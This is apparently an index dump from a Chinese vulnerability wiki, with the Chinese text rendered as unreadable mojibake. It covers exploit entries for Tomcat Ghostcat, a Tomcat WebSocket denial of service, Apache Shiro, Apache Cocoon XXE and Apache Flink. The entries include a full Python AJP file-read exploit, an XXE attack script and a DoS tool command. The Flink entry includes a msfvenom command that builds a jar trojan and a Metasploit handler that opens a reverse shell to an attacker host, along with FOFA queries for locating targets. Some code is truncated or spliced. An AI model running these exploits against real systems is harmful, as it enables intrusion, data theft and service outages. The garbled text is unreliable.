ÂºÄÂèë‰∏≠ÊúÄ‰∏ªÊµÅÁöÑÁºñÁ®ãËØ≠Ë®ÄÔºåËÄå Tomcat ÊòØÂΩìÂâçÊúÄÊµÅË°åÁöÑ Java ‰∏≠Èó¥‰ª∂ÊúçÂä°Âô®‰πã‰∏ÄÔºå‰ªéÂàùÁâàÂèëÂ∏ÉÂà∞Áé∞Âú®Â∑≤ÁªèÊúâ‰∫åÂçÅÂ§öÂπ¥ÂéÜÂè≤ÔºåÂú®‰∏ñÁïåËåÉÂõ¥ÂÜÖÂπøÊ≥õ‰ΩøÁî®„ÄÇ GhostcatÔºàÂπΩÁÅµÁå´Ôºâ ÊòØÁî±Èïø‰∫≠ÁßëÊäÄÂÆâÂÖ®Á†îÁ©∂ÂëòÂèëÁé∞ÁöÑÂ≠òÂú®‰∫é Tomcat ‰∏≠ÁöÑÂÆâÂÖ®ÊºèÊ¥ûÔºåÁî±‰∫é Tomcat AJP ÂçèËÆÆËÆæËÆ°‰∏äÂ≠òÂú®Áº∫Èô∑ÔºåÊîªÂáªËÄÖÈÄöËøá Tomcat AJP Connector ÂèØ‰ª•ËØªÂèñÊàñÂåÖÂê´ Tomcat ‰∏äÊâÄÊúâ webapp ÁõÆÂΩï‰∏ãÁöÑ‰ªªÊÑèÊñá‰ª∂Ôºå‰æãÂ¶ÇÂèØ‰ª•ËØªÂèñ webapp ÈÖçÁΩÆÊñá‰ª∂ÊàñÊ∫ê‰ª£Á†Å„ÄÇÊ≠§Â§ñÂú®ÁõÆÊ†áÂ∫îÁî®ÊúâÊñá‰ª∂‰∏ä‰º†ÂäüËÉΩÁöÑÊÉÖÂÜµ‰∏ãÔºåÈÖçÂêàÊñá‰ª∂ÂåÖÂê´ÁöÑÂà©Áî®ËøòÂèØ‰ª•ËææÂà∞ËøúÁ®ã‰ª£Á†ÅÊâßË°åÁöÑÂç±ÂÆ≥„ÄÇ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Apache Tomcat 6 Apache Tomcat 7 Apache Tomcat 8 Apache Tomcat 9 ÁéØÂ¢ÉÊê≠Âª∫ https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2020-1938 docker-compose up -d ËÆøÈóÆ http://xxx.xxx.xxx.xxx:8080/ Ê≠£Â∏∏Âç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ ÁõÆÂâçÊúâÂèØÈù†ÁöÑÂà©Áî®ËÑöÊú¨ GihubÂ∑•ÂÖ∑‰∏ãËΩΩÈìæÊé• python CNVD-2020-10487-Tomcat-Aj p-lfi.py -p 8009 -f /WEB-INF/web.xml xxx.xxx.xxx.xxx [!NOTE] ËÑöÊú¨ÈúÄË¶Å‰ΩøÁî®python2Êù•ËøêË°åÔºåÊ≠§ÊºèÊ¥ûÁî®‰∫é‰∏ä‰º†Ë∑ØÂæÑÂèØÊéßÔºåÂºÄÊîæ8009Á´ØÂè£AJPÂçèËÆÆÊÉÖÂÜµ‰∏ãÈÄöËøáËØªÂèñÊñá‰ª∂ÊâßË°åÂëΩ‰ª§ ÊºèÊ¥ûÂà©Áî®POC https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/blob/master/CNVD-2020-10487-Tomcat-Ajp-lfi.py #!/usr/bin/env python #CNVD-2020-10487 Tomcat-Ajp lfi #by ydhcui import struct # Some references: # https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html def pack_string(s): if s is None: return struct.pack(\">h\", -1) l = len(s) return struct.pack(\">H%dsb\" % l, l, s.encode('utf8'), 0) def unpack(stream, fmt): size = struct.calcsize(fmt) buf = stream.read(size) return struct.unpack(fmt, buf) def unpack_string(stream): size, = unpack(stream, \">h\") if size == -1: # null string return None res, = unpack(stream, \"%ds\" % size) stream.read(1) # \\0 return res class NotFoundException(Exception): pass class AjpBodyRequest(object): # server == web server, container == servlet SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2) MAX_REQUEST_LENGTH = 8186 def __init__(self, data_stream, data_len, data_direction=None): self.data_stream = data_stream self.data_len = data_len self.data_direction = data_direction def serialize(self): data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH) if len(data) == 0: return struct.pack(\">bbH\", 0x12, 0x34, 0x00) else: res = struct.pack(\">H\", len(data)) res += data if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER: header = struct.pack(\">bbH\", 0x12, 0x34, len(res)) else: header = struct.pack(\">bbH\", 0x41, 0x42, len(res)) return header + res def send_and_receive(self, socket, stream): while True: data = self.serialize() socket.send(data) r = AjpResponse.receive(stream) while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS: r = AjpResponse.receive(stream) if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4: break class AjpForwardRequest(object): _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(28) REQUEST_METHODS = {'GET': GET, 'POST': POST, 'HEAD': HEAD, 'OPTIONS': OPTIONS, 'PUT': PUT, 'DELETE': DELETE, 'TRACE': TRACE} # server == web server, container == servlet SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2) COMMON_HEADERS = [\"SC_REQ_ACCEPT\", \"SC_REQ_ACCEPT_CHARSET\", \"SC_REQ_ACCEPT_ENCODING\", \"SC_REQ_ACCEPT_LANGUAGE\", \"SC_REQ_AUTHORIZATION\", \"SC_REQ_CONNECTION\", \"SC_REQ_CONTENT_TYPE\", \"SC_REQ_CONTENT_LENGTH\", \"SC_REQ_COOKIE\", \"SC_REQ_COOKIE2\", \"SC_REQ_HOST\", \"SC_REQ_PRAGMA\", \"SC_REQ_REFERER\", \"SC_REQ_USER_AGENT\" ] ATTRIBUTES = [\"context\", \"servlet_path\", \"remote_user\", \"auth_type\", \"query_string\", \"route\", \"ssl_cert\", \"ssl_cipher\", \"ssl_session\", \"req_attribute\", \"ssl_key_size\", \"secret\", \"stored_method\"] def __init__(self, data_direction=None): self.prefix_code = 0x02 self.method = None self.protocol = None self.req_uri = None self.remote_addr = None self.remote_host = None self.server_name = None self.server_port = None self.is_ssl = None self.num_headers = None self.request_headers = None self.attributes = None self.data_direction = data_direction def pack_headers(self): self.num_headers = len(self.request_headers) res = \"\" res = struct.pack(\">h\", self.num_headers) for h_name in self.request_headers: if h_name.startswith(\"SC_REQ\"): code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1 res += struct.pack(\"BB\", 0xA0, code) else: res += pack_string(h_name) res += pack_string(self.request_headers[h_name]) return res def pack_attributes(self): res = b\"\" for attr in self.attributes: a_name = attr['name'] code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1 res += struct.pack(\"b\", code) if a_name == \"req_attribute\": aa_name, a_value = attr['value'] res += pack_string(aa_name) res += pack_string(a_value) else: res += pack_string(attr['value']) res += struct.pack(\"B\", 0xFF) return res def serialize(self): res = \"\" res = struct.pack(\"bb\", self.prefix_code, self.method) res += pack_string(self.protocol) res += pack_string(self.req_uri) res += pack_string(self.remote_addr) res += pack_string(self.remote_host) res += pack_string(self.server_name) res += struct.pack(\">h\", self.server_port) res += struct.pack(\"?\", self.is_ssl) res += self.pack_headers() res += self.pack_attributes() if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER: header = struct.pack(\">bbh\", 0x12, 0x34, len(res)) else: header = struct.pack(\">bbh\", 0x41, 0x42, len(res)) return header + res def parse(self, raw_packet): stream = StringIO(raw_packet) self.magic1, self.magic2, data_len = unpack(stream, \"bbH\") self.prefix_code, self.method = unpack(stream, \"bb\") self.protocol = unpack_string(stream) self.req_uri = unpack_string(stream) self.remote_addr = unpack_string(stream) self.remote_host = unpack_string(stream) self.server_name = unpack_string(stream) self.server_port = unpack(stream, \">h\") self.is_ssl = unpack(stream, \"?\") self.num_headers, = unpack(stream, \">H\") self.request_headers = {} for i in range(self.num_headers): code, = unpack(stream, \">H\") if code > 0xA000: h_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001] else: h_name = unpack(stream, \"%ds\" % code) stream.read(1) # \\0 h_value = unpack_string(stream) self.request_headers[h_name] = h_value def send_and_receive(self, socket, stream, save_cookies=False): res = [] i = socket.sendall(self.serialize()) if self.method == AjpForwardRequest.POST: return res r = AjpResponse.receive(stream) assert r.prefix_code == AjpResponse.SEND_HEADERS res.append(r) if save_cookies and 'Set-Cookie' in r.response_headers: self.headers['SC_REQ_COOKIE'] = r.response_headers['Set-Cookie'] # read body chunks and end response packets while True: r = AjpResponse.receive(stream) res.append(r) if r.prefix_code == AjpResponse.END_RESPONSE: break elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK: continue else: raise NotImplementedError break return res class AjpResponse(object): _,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7) COMMON_SEND_HEADERS = [ \"Content-Type\", \"Content-Language\", \"Content-Length\", \"Date\", \"Last-Modified\", \"Location\", \"Set-Cookie\", \"Set-Cookie2\", \"Servlet-Engine\", \"Status\", \"WWW-Authenticate\" ] def parse(self, stream): # read headers self.magic, self.data_length, self.prefix_code = unpack(stream, \">HHb\") if self.prefix_code == AjpResponse.SEND_HEADERS: self.parse_send_headers(stream) elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK: self.parse_send_body_chunk(stream) elif self.prefix_code == AjpResponse.END_RESPONSE: self.parse_end_response(stream) elif self.prefix_code == AjpResponse.GET_BODY_CHUNK: self.parse_get_body_chunk(stream) else: raise NotImplementedError def parse_send_headers(self, stream): self.http_status_code, = unpack(stream, \">H\") self.http_status_msg = unpack_string(stream) self.num_headers, = unpack(stream, \">H\") self.response_headers = {} for i in range(self.num_headers): code, = unpack(stream, \">H\") if code H\") self.data = stream.read(self.data_length+1) def parse_end_response(self, stream): self.reuse, = unpack(stream, \"b\") def parse_get_body_chunk(self, stream): rlen, = unpack(stream, \">H\") return rlen @staticmethod def receive(stream): r = AjpResponse() r.parse(stream) return r import socket def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET): fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER) fr.method = method fr.protocol = \"HTTP/1.1\" fr.req_uri = req_uri fr.remote_addr = target_host fr.remote_host = None fr.server_name = target_host fr.server_port = 80 fr.request_headers = { 'SC_REQ_ACCEPT': 'text/html', 'SC_REQ_CONNECTION': 'keep-alive', 'SC_REQ_CONTENT_LENGTH': '0', 'SC_REQ_HOST': target_host, 'SC_REQ_USER_AGENT': 'Mozilla', 'Accept-Encoding': 'gzip, deflate, sdch', 'Accept-Language': 'en-US,en;q=0.5', 'Upgrade-Insecure-Requests': '1', 'Cache-Control': 'max-age=0' } fr.is_ssl = False fr.attributes = [] return fr class Tomcat(object): def __init__(self, target_host, target_port): self.target_host = target_host self.target_port = target_port self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) self.socket.connect((target_host, target_port)) self.stream = self.socket.makefile(\"rb\", bufsize=0) def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]): self.req_uri = req_uri self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method)) print(\"Getting resource at ajp13://%s:%d%s\" % (self.target_host, self.target_port, req_uri)) if user is not None and password is not None: self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = \"Basic \" + (\"%s:%s\" % (user, password)).encode('base64').replace('\\n', '') for h in headers: self.forward_request.request_headers[h] = headers[h] for a in attributes: self.forward_request.attributes.append(a) responses = self.forward_request.send_and_receive(self.socket, self.stream) if len(responses) == 0: return None, None snd_hdrs_res = responses[0] data_res = responses[1:-1] if len(data_res) == 0: print(\"No data in response. Headers:%s\\n\" % snd_hdrs_res.response_headers) return snd_hdrs_res, data_res ''' javax.servlet.include.request_uri javax.servlet.include.path_info javax.servlet.include.servlet_path ''' import argparse parser = argparse.ArgumentParser() parser.add_argument(\"target\", type=str, help=\"Hostname or IP to attack\") parser.add_argument('-p', '--port', type=int, default=8009, help=\"AJP port to attack (default is 8009)\") parser.add_argument(\"-f\", '--file', type=str, default='WEB-INF/web.xml', help=\"file path :(WEB-INF/web.xml)\") args = parser.parse_args() t = Tomcat(args.target, args.port) _,data = t.perform_request('/asdf',attributes=[ {'name':'req_attribute','value':['javax.servlet.include.request_uri','/']}, {'name':'req_attribute','value':['javax.servlet.include.path_info',args.file]}, {'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']}, ]) print('----------------------------') print(\"\".join([d.data for d in data])) ÂèÇËÄÉÊñáÁ´† GithubÂú∞ÂùÄ Â®ÅËÉÅÈÄöÂëä APACHE TOMCAT Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥ûÔºàCVE-2020-1938Ôºâ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Tomcat/Apache Tomcat WebSocket ÊãíÁªùÊúçÂä°ÊºèÊ¥û CVE-2020-13935.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Tomcat/Apache Tomcat WebSocket ÊãíÁªùÊúçÂä°ÊºèÊ¥û CVE-2020-13935.html","title":"Apache Tomcat WebSocket ÊãíÁªùÊúçÂä°ÊºèÊ¥û CVE-2020-13935","keywords":"","body":"Apache Tomcat WebSocket ÊãíÁªùÊúçÂä°ÊºèÊ¥û CVE-2020-13935 ÊºèÊ¥ûÊèèËø∞ 2020Âπ¥11Êúà06Êó•Ôºå360CERTÁõëÊµãÂèëÁé∞@RedTeamPentestingÂèëÂ∏É‰∫ÜTomcat WebSokcet ÊãíÁªùÊúçÂä°ÊºèÊ¥û ÁöÑÂàÜÊûêÊä•ÂëäÔºåËØ•ÊºèÊ¥ûÁºñÂè∑‰∏∫ CVE-2020-13935 ÔºåÊºèÊ¥ûÁ≠âÁ∫ßÔºöÈ´òÂç± ÔºåÊºèÊ¥ûËØÑÂàÜÔºö7.5 „ÄÇ Êú™ÊéàÊùÉÁöÑËøúÁ®ãÊîªÂáªËÄÖÈÄöËøáÂèëÈÄÅ Â§ßÈáèÁâπÂà∂ËØ∑Ê±ÇÂåÖ Âà∞TomcatÊúçÂä°Âô® ,ÂèØÈÄ†ÊàêÊúçÂä°Âô®ÂÅúÊ≠¢ÂìçÂ∫îÂπ∂Êó†Ê≥ïÊèê‰æõÊ≠£Â∏∏ÊúçÂä° ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Apache Tomcat 10.0.0-M1-10.0.0-M6 Apache Tomcat 9.0.0.M1-9.0.36 Apache Tomcat 8.5.0-8.5.56 Apache Tomcat 7.0.27-7.0.104 ÁéØÂ¢ÉÊê≠Âª∫ https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2020-1938 docker-compose up -d ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆÁõÆÊ†áÔºåÊü•ÁúãÁâàÊú¨ÊòØÂê¶Âú®ÊºèÊ¥ûÁâàÊú¨ËåÉÂõ¥ÂÜÖ Êü•ÁúãÊîªÂáªÂâçÁöÑÂÜÖÂ≠ò‰ΩøÁî®ÊÉÖÂÜµ CVE-2020-13935 EXPÂú∞ÂùÄ [!NOTE] EXP‰ΩøÁî®ÈúÄË¶ÅGOÁéØÂ¢É Â¶ÇÊûúÂá∫Áé∞ go: github.com/gorilla/websocket@v1.4.2: Get \"https://proxy.golang.org/github.com/gorilla/websocket/@v/v1.4.2.mod\": dial tcp 172.217.160.81:443: connectex: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond. ÈúÄË¶Å‰ΩøÁî®ÂëΩ‰ª§ÂàáÊç¢Ê∫ê go env -w GOPROXY=https://goproxy.cn ‰ΩøÁî®EXPÊîªÂáª tcdos ws://192.168.51.133:8080/examples/websocket/echoStreamAnnotation CPU Ë¥üËç∑Ë∂ÖËΩΩÔºåÊàêÂäüÊîªÂáª ÊºèÊ¥ûÂà©Áî®POC CVE-2020-13935 EXPÂú∞ÂùÄ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Shiro/":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Shiro/","title":"Apache Shio","keywords":"","body":"Apache Shiro Apache Shiro Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Shiro/Apache Shiro Â∞è‰∫é1.2.4ÂèçÂ∫èÂàóÂåñÊºèÊ¥û CVE-2016-4437.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Shiro/Apache Shiro Â∞è‰∫é1.2.4ÂèçÂ∫èÂàóÂåñÊºèÊ¥û CVE-2016-4437.html","title":"Apache Shiro =1.2.4ÂèçÂ∫èÂàóÂåñÊºèÊ¥û CVE-2016-4437","keywords":"","body":"Apache Shiro ÊºèÊ¥ûÊèèËø∞ Apache ShiroÊòØ‰∏ÄÊ¨æÂºÄÊ∫êÂÆâÂÖ®Ê°ÜÊû∂ÔºåÊèê‰æõË∫´‰ªΩÈ™åËØÅ„ÄÅÊéàÊùÉ„ÄÅÂØÜÁ†ÅÂ≠¶Âíå‰ºöËØùÁÆ°ÁêÜ„ÄÇShiroÊ°ÜÊû∂Áõ¥ËßÇ„ÄÅÊòìÁî®ÔºåÂêåÊó∂‰πüËÉΩÊèê‰æõÂÅ•Â£ÆÁöÑÂÆâÂÖ®ÊÄß„ÄÇ Apache Shiro 1.2.4Âèä‰ª•ÂâçÁâàÊú¨‰∏≠ÔºåÂä†ÂØÜÁöÑÁî®Êà∑‰ø°ÊÅØÂ∫èÂàóÂåñÂêéÂ≠òÂÇ®Âú®Âêç‰∏∫remember-meÁöÑCookie‰∏≠„ÄÇÊîªÂáªËÄÖÂèØ‰ª•‰ΩøÁî®ShiroÁöÑÈªòËÆ§ÂØÜÈí•‰º™ÈÄ†Áî®Êà∑CookieÔºåËß¶ÂèëJavaÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÔºåËøõËÄåÂú®ÁõÆÊ†áÊú∫Âô®‰∏äÊâßË°å‰ªªÊÑèÂëΩ‰ª§„ÄÇ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Apache Shiro ÊºèÊ¥ûÁéØÂ¢É https://github.com/vulhub/vulhub.git cd vulhub/shiro/CVE-2016-4437 docker-compose up -d ËÆøÈóÆhttp://xxx.xxx.xxx.xxx:8080/loginÊ≠£Â∏∏Âç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ ShiroÂ∑≤ÁªèÊúâÊØîËæÉÂÆåÂñÑÁöÑÂ∑•ÂÖ∑ https://github.com/insightglacier/Shiro_exploit https://github.com/feihong-cs/ShiroExploit/releases/tag/v2.51 ËøôÈáå‰ΩøÁî®ÁöÑÊòØ ShiroExploit Â∑•ÂÖ∑ËøõË°åÂ§çÁé∞ ÊâìÂºÄÂêéËæìÂÖ•urlÂç≥ÂèØ ÊàêÂäüÂèçÂºπshell ÂèÇËÄÉÊñáÁ´† Shiro RememberMe 1.2.4ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û-ËØ¶ÁªÜÂàÜÊûê Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Cocoon/":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Cocoon/","title":"Apache Coocon","keywords":"","body":"Apache Cocoon Apache Cocoon XMLÊ≥®ÂÖ• CVE-2020-11991 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Cocoon/Apache Cocoon XMLÊ≥®ÂÖ• CVE-2020-11991.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Cocoon/Apache Cocoon XMLÊ≥®ÂÖ• CVE-2020-11991.html","title":"Apache Cocoon XMLÊ≥®ÂÖ• CVE-2020-11991","keywords":"","body":"Apache Cocoon XMLÊ≥®ÂÖ• CVE-2020-11991 ÊºèÊ¥ûÊèèËø∞ 9Êúà11Êó• Apache ËΩØ‰ª∂Âü∫Èáë‰ºöÂèëÂ∏ÉÂÆâÂÖ®ÂÖ¨ÂëäÔºå‰øÆÂ§ç‰∫Ü Apache Cocoon xmlÂ§ñÈÉ®ÂÆû‰ΩìÊ≥®ÂÖ•ÊºèÊ¥ûÔºàCVE-2020-11991Ôºâ„ÄÇ Apache Cocoon ÊòØ‰∏Ä‰∏™Âü∫‰∫é Spring Ê°ÜÊû∂ÁöÑÂõ¥ÁªïÂàÜÁ¶ªÁêÜÂøµÂª∫Á´ãÁöÑÊûÑÊû∂ÔºåÂú®ËøôÁßçÊ°ÜÊû∂‰∏ãÁöÑÊâÄÊúâÂ§ÑÁêÜÈÉΩË¢´È¢ÑÂÖàÂÆö‰πâÂ•ΩÁöÑÂ§ÑÁêÜÁªÑ‰ª∂Á∫øÊÄßËøûÊé•Ëµ∑Êù•ÔºåËÉΩÂ§üÂ∞ÜËæìÂÖ•Âíå‰∫ßÁîüÁöÑËæìÂá∫ÊåâÁÖßÊµÅÊ∞¥Á∫øÈ°∫Â∫èÂ§ÑÁêÜ„ÄÇÁî®Êà∑Áæ§ÔºöApache Lenya„ÄÅDaisy CMS„ÄÅHippo CMS„ÄÅMindquarryÁ≠âÁ≠âÔºåApache Cocoon ÈÄöÂ∏∏Ë¢´‰Ωú‰∏∫‰∏Ä‰∏™Êï∞ÊçÆÊäΩÂèñ„ÄÅËΩ¨Êç¢„ÄÅÂä†ËΩΩÂ∑•ÂÖ∑ÊàñËÄÖÊòØÁ≥ªÁªü‰πãÈó¥‰º†ËæìÊï∞ÊçÆÁöÑ‰∏≠ËΩ¨Á´ô„ÄÇCVE-2020-11991 ‰∏é StreamGenerator ÊúâÂÖ≥ÔºåÂú®‰ΩøÁî® StreamGenerator Êó∂Ôºå‰ª£Á†ÅÂ∞ÜËß£ÊûêÁî®Êà∑Êèê‰æõÁöÑ xml„ÄÇÊîªÂáªËÄÖÂèØ‰ª•‰ΩøÁî®ÂåÖÊã¨Â§ñÈÉ®Á≥ªÁªüÂÆû‰ΩìÂú®ÂÜÖÁöÑÁâπÂà∂ xml Êù•ËÆøÈóÆÊúçÂä°Âô®Á≥ªÁªü‰∏äÁöÑ‰ªª‰ΩïÊñá‰ª∂„ÄÇ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Apache Cocoon FOFA [!NOTE] app=\"Apache-Cocoon\" ÊºèÊ¥ûÂ§çÁé∞ Âêë/v2/api/product/manger/getInfo POSTÂ¶Ç‰∏ãÂÜÖÂÆπ ]> John &ent; ÊºèÊ¥ûÂà©Áî®POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Apache Cocoon >> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/v2/api/product/manger/getInfo\" data = \"\"\" ]> John &ent; \"\"\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-type\": \"text/xml\" } response = requests.request(\"POST\", url=vuln_url, data=data, headers=headers, timeout=20) if \"/bin/bash\" in response.text: print(\"\\033[32m[o] Âê´ÊúâCVE-2020-11991ÊºèÊ¥ûÔºåÂìçÂ∫î‰∏∫{}\\033[0m\".format(response.text)) else: print(\"\\033[31m[x] ÊºèÊ¥ûÂà©Áî®Â§±Ë¥• \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Flink/":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Flink/","title":"Apache Flink ","keywords":"","body":"Apache Flink Apache Flink Apache Flink ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û CVE-2020-17519 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Flink/Apache Flink Â∞è‰∫é1.9.1ËøúÁ®ã‰ª£Á†ÅÊâßË°å CVE-2020-17518.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Flink/Apache Flink Â∞è‰∫é1.9.1ËøúÁ®ã‰ª£Á†ÅÊâßË°å CVE-2020-17518.html","title":"Apache Flink Â∞è‰∫é1.9.1ËøúÁ®ã‰ª£Á†ÅÊâßË°å CVE-2020-17518","keywords":"","body":"Apache Flink ÊºèÊ¥ûÊèèËø∞ ËøëÊó•,ÊúâÂÆâÂÖ®Á†îÁ©∂ÂëòÂÖ¨ÂºÄ‰∫Ü‰∏Ä‰∏™Apache FlinkÁöÑ‰ªªÊÑèJarÂåÖ‰∏ä‰º†ÂØºËá¥ËøúÁ®ã‰ª£Á†ÅÊâßË°åÁöÑÊºèÊ¥û. ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Apache Flink FOFA FOFA ËØ≠Âè• app=\"Apache-Flink\" && country=\"CN\" ÂõΩÂÜÖËøòÊòØÂæàÂ§ö‰ΩøÁî® Apache Flink ÁöÑÔºåÂ§ßÊ¶ÇÊúâ1000ÁöÑÊï∞ÈáèÂ∑¶Âè≥ ÊºèÊ¥ûÂ§çÁé∞ ÊâìÂºÄ‰∏Ä‰∏™‰ΩøÁî® Apache Flink ÁöÑÁΩëÁ´ôÔºåÊâìÂºÄÂêéÈ°µÈù¢‰∏∫ËøôÊ†∑Â≠ê ÁÇπÂáªÊü•ÁúãÊñá‰ª∂‰∏ä‰º†È°µÈù¢ ÊâìÂºÄMSF ÁîüÊàê‰∏Ä‰∏™ jar Êú®È©¨ msfvenom -p java/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=4444 -f jar > test.jar ÁÇπÂáª Add ‰∏ä‰º† jar Êñá‰ª∂ ÁõëÂê¨Á´ØÂè£ msf6 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) > set payload java/shell/reverse_tcp payload => java/shell/reverse_tcp msf6 exploit(multi/handler) > set lhost xxx.xxx.xxx.xxx lhost => xxx.xxx.xxx.xxx msf6 exploit(multi/handler) > set lport 4444 lport => 4444 msf6 exploit(multi/handler) > run ÁÇπÂáª‰∏ã submit ÂèçÂºπÂõûÊù•‰∏Ä‰∏™root ÊùÉÈôêshell ÊºèÊ¥ûÊ£ÄÊµãPOC import requests def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Apache Flink >> http://xxx.xxx.xxx.xxx:9999 \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/jars/upload\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.get(url=vuln_url, headers=headers, timeout=20) if \"Unable to load requested file /jars/upload.\" in response.text: print(\"\\033[32m[o] ÂèØËÉΩÂ≠òÂú® Apache Flink >> \\033[0m\")) POC_1(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 